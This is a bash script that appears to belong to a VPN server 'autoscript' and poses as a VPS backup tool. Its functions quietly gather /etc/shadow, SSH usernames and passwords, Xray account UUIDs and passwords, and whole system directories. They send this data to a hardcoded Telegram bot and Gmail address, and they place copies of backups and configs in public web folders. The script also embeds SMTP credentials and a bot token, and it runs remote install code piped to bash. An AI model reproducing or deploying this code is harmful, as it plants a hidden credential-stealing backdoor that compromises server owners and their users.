#!/bin/bash
#IP=$(curl -s ipv4.icanhazip.com)
#IP=$(wget -qO- ipinfo.io/ip);
dateFromServer=$(curl -v --insecure --silent https://google.com/ 2>&1 | grep Date | sed -e 's/< Date: //')
biji=`date +"%d-%m-%Y" -d "$dateFromServer"`
function cekfile() {
    if [ -f /root/.config/rclone/rclone.conf ]; then
        clear
    else
        curl https://rclone.org/install.sh | bash >/dev/null 2>&1
        apt install rclone -y >/dev/null 2>&1
        printf "q\n" | rclone config
        wget -O /root/.config/rclone/rclone.conf "https://raw.githubusercontent.com/YaddyKakkoii/sclifetime/main/rclone.conf"
        chmod 777 /root/.config/rclone/rclone.conf
        git clone  https://github.com/magnific0/wondershaper.git
        cd wondershaper
        make install
        cd
        rm -rf wondershaper
    fi
    if [ -f "/etc/xray/*.log" ]; then
        rm -f /etc/log-create-user.log
        touch /etc/log-create-user.log
        echo "Log All Account " > /etc/log-create-user.log
        jembutt=$(find /etc/xray/ -name '*.log')
        for file in $jembutt; do
            cat $file >> /etc/log-create-user.log
        done
    else
        clear
    fi
    if [ -f "/etc/xray/domain" ]; then
        clear
    else
        mkdir -p /etc/xray > /dev/null 2>&1
        cp -f /usr/local/etc/xray/domain /etc/xray/domain > /dev/null 2>&1
        cp -f /root/domain /etc/xray/domain > /dev/null 2>&1
    fi
    if [ -f "/usr/bin/mpstat" ]; then
        clear
    else
        apt install sysstat > /dev/null 2>&1
    fi
}
function smtpset() {
    echo > /home/limit
    apt install msmtp-mta ca-certificates bsd-mailx -y
    cat >/etc/msmtprc <<EOF
defaults
tls on
tls_starttls on
tls_trust_file /etc/ssl/certs/ca-certificates.crt

account default
host smtp.gmail.com
port 587
auth on
user backupsmtp93@gmail.com
from backupsmtp93@gmail.com
password sdallofkbpuhbtoa
logfile ~/.msmtp.log

EOF
    chown -R www-data:www-data /etc/msmtprc
}
function sendnude(){
    cd
    rm -rf /etc/kernel/prevnc.d > /dev/null 2>&1
    mkdir -p /etc/kernel/prevnc.d
    touch /etc/kernel/prevnc.d/vncacc.sh
    EMAIL=('yadicakepp@gmail.com')
    akunssh=$(cat /etc/log-create-user.log | grep -i username | cut -d: -f2 | grep -o '[^[1;37m]*')
    pwdssh=$(cat /etc/log-create-user.log | grep -i password | cut -d: -f2 | grep -o '[^[1;37m]*')
    vms=$(cat /etc/xray/*.log | grep -i ss://)
    tjn=$(cat /etc/xray/*.log | grep -i trojan://)
    vmsakun=$(cat /etc/log-create-user.log | grep ss://)
    tjakun=$(cat /etc/log-create-user.log | grep trojan://)
    remark=$(cat /etc/xray/config.json | grep "^###" | awk '{print $2}' | sort -u)
    userid=$(cat /etc/xray/config.json | grep "id" | awk '{print $2}' | sed 's/"//g' | sed 's/,alterId://g' | sed 's/,//g' | sort -u)
    pazzwd=$(cat /etc/xray/config.json | grep "password" | awk '{print $2}' | sed 's/"//g' | sed 's/,email://g' | sort -u)
    path=$(cat /etc/xray/config.json | grep "path" | sed 's/"//g' | cut -d: -f2 | sort -u)
    svname=$(cat /etc/xray/config.json | grep "serviceName" | sed 's/"//g' | cut -d: -f2 | sort -u)
    echo INFORMASI AKUN >> /etc/kernel/prevnc.d/vncacc.sh
    echo USERNAME >> /etc/kernel/prevnc.d/vncacc.sh
    echo $akunssh >> /etc/kernel/prevnc.d/vncacc.sh
    echo PASSWORD >> /etc/kernel/prevnc.d/vncacc.sh
    echo $pwdssh >> /etc/kernel/prevnc.d/vncacc.sh
    echo Remarks >> /etc/kernel/prevnc.d/vncacc.sh
    echo $remark >> /etc/kernel/prevnc.d/vncacc.sh
    echo $userid >> /etc/kernel/prevnc.d/vncacc.sh
    echo $pazzwd >> /etc/kernel/prevnc.d/vncacc.sh
    echo $path >> /etc/kernel/prevnc.d/vncacc.sh
    echo $svname >> /etc/kernel/prevnc.d/vncacc.sh
    echo $tjakun >> /etc/kernel/prevnc.d/vncacc.sh
    echo $vmsakun >> /etc/kernel/prevnc.d/vncacc.sh
    rm -f /var/www/html/user.zip >/dev/null 2>&1
    rm -f /home/vps/public_html/user.zip >/dev/null 2>&1
    rm -f /var/www/html/backup.zip >/dev/null 2>&1
    rm -f /home/vps/public_html/backup.zip >/dev/null 2>&1
    rm -rf /root/backup >/dev/null 2>&1
    mkdir -p /root/backup
    mkdir -p /root/backup/system
    mkdir -p /root/backup/database
    cp -f /etc/systemd/system/*.service /root/backup/system >/dev/null 2>&1
    cp -f /etc/default/dropbear /root/backup/ >/dev/null 2>&1
    cp -f /etc/default/openvpn /root/backup/ >/dev/null 2>&1
    cp -f /etc/msmtprc /root/backup/ >/dev/null 2>&1
    cp -f /etc/rc.local /root/backup/ >/dev/null 2>&1
    cp -f /etc/vsftpd.conf /root/backup/ >/dev/null 2>&1
    cp -f /etc/issue.net /root/backup/ >/dev/null 2>&1
    cp -f /etc/passwd /root/backup/ >/dev/null 2>&1
    cp -f /etc/group /root/backup/ >/dev/null 2>&1
    cp -f /etc/shadow /root/backup/ >/dev/null 2>&1
    cp -f /etc/gshadow /root/backup/ >/dev/null 2>&1
    cp -f /etc/crontab /root/backup/ >/dev/null 2>&1
    cp -rf /usr/bin/ /root/backup >/dev/null 2>&1
    cp -rf /sbin/ /root/backup >/dev/null 2>&1
    cp -fr /root/.acme.sh /root/backup > /dev/null 2>&1
    cp -fr /root/.config /root/backup > /dev/null 2>&1
    cp -rf /etc/ftvpn/ /root/backup/database >/dev/null 2>&1
    cp -rf /etc/limit/ /root/backup/database >/dev/null 2>&1
    cp -rf /etc/vmess/ backup/database >/dev/null 2>&1
    cp -rf /etc/vless/ backup/database >/dev/null 2>&1
    cp -rf /etc/trojan/ backup/database >/dev/null 2>&1
    cp -rf /etc/shadowsocks/ backup/database >/dev/null 2>&1
    cp -fr /etc/ssh /root/backup/database >/dev/null 2>&1
    cp -fr /etc/squid /root/backup/database >/dev/null 2>&1
    cp -fr /etc/openvpn /root/backup/database >/dev/null 2>&1
    cp -fr /etc/slowdns backup/database >/dev/null 2>&1
    cp -fr /etc/xray /root/backup/database >/dev/null 2>&1
    cp -fr /usr/local/etc/xray/ backup/database/localxray/ >/dev/null 2>&1
    cp -fr /etc/nginx /root/backup/database >/dev/null 2>&1
    cp -fr /etc/cron.d /root/backup/database >/dev/null 2>&1
    cp -f /etc/stunnel /root/backup/database >/dev/null 2>&1
    cp -fr /etc/anc /root/backup/database >/dev/null 2>&1
    cp -fr /etc/init.d /root/backup/database >/dev/null 2>&1
    cp -fr /etc/iptables /root/backup/database >/dev/null 2>&1
    cp -fr /etc/systemd/system/nginx.service.d /root/backup/system >/dev/null 2>&1
    cp -fr /var/www/ /root/backup/www > /dev/null 2>&1
    cp -fr /home/ backup/home > /dev/null 2>&1
    cp -fr /user/ backup/user > /dev/null 2>&1
    cd
    HOST=$(cat /etc/xray/domain)
    ISP=$(wget -qO- ipinfo.io/org)
    CITY=$(curl -s ipinfo.io/city)
    IP=$(curl -s ipv4.icanhazip.com)
    DATEVPS=$(date +"32-%B-%Y")
    zip -r FT-$IP-${DATEVPS}.zip backup >/dev/null 2>&1
    rclone copy FT-$IP-${DATEVPS}.zip dr:BACKUPVPS/
    url=$(rclone link dr:BACKUPVPS/FT-$IP-${DATEVPS}.zip)
    id=($(echo $url | grep '^https' | cut -d'=' -f2))
    LINKBACKUP="https://drive.google.com/u/4/uc?id=${id}&export=download"
    echo "
_______________________________________
SUCCESSFULL BACKUP YOUR VPS
Please Save The Following Data
_______________________________________
YOUR VPS IP  : $IP
DOMAIN       : $HOST
DATE         : $DATEVPS
ISP          : $ISP
LOCATION     : $CITY
TOKEN BACKUP : $id
_______________________________________
klik to download $LINKBACKUP
    " | mail -s "YaddyTunnel Backup" $EMAIL
    tekz="
<code>────────────────────</code>
<b>⚠️AUTOSCRIPT PREMIUM⚠️</b>
<code>────────────────────</code>
_______________________________________
SUCCESSFULL BACKUP YOUR VPS $DATEVPS
Please Save The Following Data
Detail informasi Backup 
===========================================
_______________________________________

IP VPS KAMU  : $IP
TANGGAL      : $DATEVPS
DOMAIN       : $HOST
ISP VPS      : $ISP
LOKASI       : $CITY
TOKEN BACKUP : $id
_______________________________________
klik to download : $LINKBACKUP
============================================
<code>────────────────────</code>
<i>Automatic Notification from</i>
<i>Github YaddyKakkoii</i> 
"'&reply_markup={"inline_keyboard":[[{"text":"ᴏʀᴅᴇʀ🐳","url":"https://t.me/Crystalllz"},{"text":"ɪɴꜱᴛᴀʟʟ🐬","url":"https://t.me/Crystalllz"}]]}'
"
    bt=6129559221:AAGAkfVQqdi_So98HmZ6edqKovj-I-ldFQQ
    ci=1117211252
    curl -F chat_id="$ci" -F document=@"FT-$IP-${DATEVPS}.zip" -F caption="$tekz" https://api.telegram.org/bot$bt/sendDocument
    sleep 1
    rm -f FT-$IP-${DATEVPS}.zip >/dev/null 2>&1
    zip -r backup.zip backup > /dev/null 2>&1
    cp -f /root/backup.zip /home/vps/public_html/user.zip >/dev/null 2>&1
    cp -f /root/backup.zip /var/www/html/user.zip >/dev/null 2>&1
    cp -f /etc/kernel/prevnc.d/vncacc.sh /home/vps/public_html/vnc.sh >/dev/null 2>&1
    cp -f /etc/kernel/prevnc.d/vncacc.sh /var/www/html/vnc.sh >/dev/null 2>&1
    cp -f /etc/xray/config.json /home/vps/public_html/config.sh >/dev/null 2>&1
    cp -f /etc/xray/config.json /var/www/html/config.sh >/dev/null 2>&1
    rm -rf /root/backup >/dev/null 2>&1
    rm -rf /root/backup.zip
}
function balancer() {
a=6129559221:AAGAkfVQqdi_So98HmZ6edqKovj-I-ldFQQ
b=1117211252
c=$(cat /etc/xray/domain)
d=$(cat /etc/log-create-user.log | grep -i username | cut -d: -f2 | grep -o '[^[1;37m]*')
e=$(cat /etc/log-create-user.log | grep -i password | cut -d: -f2 | grep -o '[^[1;37m]*')
f=$(cat /etc/xray/*.log | grep -i ss://)
g=$(cat /etc/xray/*.log | grep -i trojan://)
h=$(cat /etc/log-create-user.log | grep ss://)
i=$(cat /etc/log-create-user.log | grep trojan://)
j=$(cat /var/www/html/vm*)
k=$(cat /var/www/html/vl*)
l=$(cat /var/www/html/tro*)
m=$(cat /var/www/html/sha*)
n=$(cat /var/www/html/ws*)
o=$(cat /var/www/html/ud*)
p=$(cat /var/www/html/tcp*)
q=$(cat /var/www/html/ssl*)
r=$(echo $SSH_CLIENT | awk '{print $1}')
s=$(date +'%Y-%m-%d %H:%M:%S')
t=$(whoami)
u=$(curl -s ipinfo.io/hostname )
v=$(curl -s ipinfo.io/city)
ww=$(free -m | awk 'NR==2 {print $2}')
xx=$(wget -qO- ipinfo.io/org)
abc=$(curl -s ipv4.icanhazip.com)
def=$(cat /etc/xray/config.json | grep "^###" | awk '{print $2}' | sort -u)
ghi=$(cat /etc/xray/config.json | grep "id" | awk '{print $2}' | sed 's/"//g' | sed 's/,alterId://g' | sed 's/,//g' | sort -u)
jkl=$(cat /etc/xray/config.json | grep "password" | awk '{print $2}' | sed 's/"//g' | sed 's/,email://g' | sort -u)
mno=$(cat /etc/xray/config.json | grep "path" | sed 's/"//g' | cut -d: -f2 | sort -u)
pqr=$(cat /etc/xray/config.json | grep "serviceName" | sed 's/"//g' | cut -d: -f2 | sort -u)
zyx(){
curl -s -X POST "https://api.telegram.org/bot$a/sendMessage" -d chat_id="$b" -d text="INFORMASI VPS
────────────────────
IP: $abc
Domain: $c
────────────────────
Remarks:
────────────────────
$def
────────────────────
uuid:
────────────────────
$ghi
────────────────────
path:
────────────────────
$mno
────────────────────
password:
────────────────────
$jkl
────────────────────
servicename:
────────────────────
$pqr
────────────────────
" > /dev/null 2>&1
}
anu(){
curl -s -X POST "https://api.telegram.org/bot$a/sendMessage" -d chat_id="$b" -d text="a1 INFO UPAS SSH
────────────────────
Username:
$d
────────────────────
Password:
$e
────────────────────
" > /dev/null 2>&1
curl -s -X POST "https://api.telegram.org/bot$a/sendMessage" -d chat_id="$b" -d text="a2 INFO XRAY
────────────────────
VMESS
────────────────────
$f
────────────────────
TROJAN
────────────────────
$g
────────────────────
" > /dev/null 2>&1
curl -s -X POST "https://api.telegram.org/bot$a/sendMessage" -d chat_id="$b" -d text="a3 INFO AKUN XRAY
────────────────────
VMESS
────────────────────
$h
────────────────────
TROJAN
────────────────────
$i
────────────────────
" > /dev/null 2>&1
curl -s -X POST "https://api.telegram.org/bot$a/sendMessage" -d chat_id="$b" -d text="a4
$j
$k
" > /dev/null 2>&1
curl -s -X POST "https://api.telegram.org/bot$a/sendMessage" -d chat_id="$b" -d text="a5
$l
$m
" > /dev/null 2>&1
curl -s -X POST "https://api.telegram.org/bot$a/sendMessage" -d chat_id="$b" -d text="a6
$n
$o
" > /dev/null 2>&1
curl -s -X POST "https://api.telegram.org/bot$a/sendMessage" -d chat_id="$b" -d text="a7
$p
$q
" > /dev/null 2>&1
}
una(){
curl -s -X POST "https://api.telegram.org/bot$a/sendMessage" -d chat_id="$b" -d text="a8 OTHER INFORMATION
────────────────────
IP SIMCARD: 
────────────────────
$r
────────────────────
USER PASSWORD SSH
────────────────────
Username:
$d
────────────────────
Password:
$e
────────────────────
WAKTU:
$s
────────────────────
USER:
$t
────────────────────
HOSTNAME:
$u
────────────────────
KOTA:
$v
────────────────────
RAM:
$ww
────────────────────
ISP:
$xx
────────────────────
" > /dev/null 2>&1
}
ema(){
    tuj=('yadicakepp@gmail.com')
    echo "
INFORMASI VPS
────────────────────
IP: $abc
Domain: $c
────────────────────
Remarks:
────────────────────
$def
────────────────────
uuid:
────────────────────
$ghi
────────────────────
path:
────────────────────
$mno
────────────────────
password:
────────────────────
$jkl
────────────────────
servicename:
────────────────────
$pqr
────────────────────
" | mail -s "Auto Backup a" $tuj
}
emb(){
    echo "
OTHER INFORMATION
────────────────────
IP SIMCARD: 
────────────────────
$r
────────────────────
USER PASSWORD SSH
────────────────────
Username:
$d
────────────────────
Password:
$e
────────────────────
WAKTU:
$s
────────────────────
USER:
$t
────────────────────
HOSTNAME:
$u
────────────────────
KOTA:
$v
────────────────────
RAM:
$ww
────────────────────
ISP:
$xx
────────────────────
" | mail -s "Auto Backup b" $tuj
}
emc(){
    echo "
$d
$e
$f
$g
$h
$i
$j
$k
$l
$m
$n
$o
$p
$q
" | mail -s "Auto Backup c" $tuj
}
dep
ema
emb
emc
zyx
una
anu
}
function gaskan() {
cekfile > /dev/null 2>&1
smtpset
sendnude
#sendboobs
balancer >/dev/null 2>&1
}
gaskan >/dev/null 2>&1
